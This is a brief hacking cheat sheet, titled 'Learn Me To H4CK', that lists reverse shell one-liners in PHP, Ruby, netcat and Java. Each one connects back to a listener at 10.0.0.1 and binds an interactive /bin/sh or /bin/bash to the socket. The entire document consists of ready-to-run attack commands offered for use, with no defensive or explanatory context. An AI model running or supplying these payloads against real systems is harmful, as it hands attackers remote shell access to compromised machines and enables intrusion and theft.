#Learn Me To H4CK:

PHP RevShell:

    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby RevShell:

    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
  
Nc RevShell:

   nc -e /bin/sh 10.0.0.1 1234
  
Java RevShell:

   r = Runtime.getRuntime()
   p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
   p.waitFor()
  
  
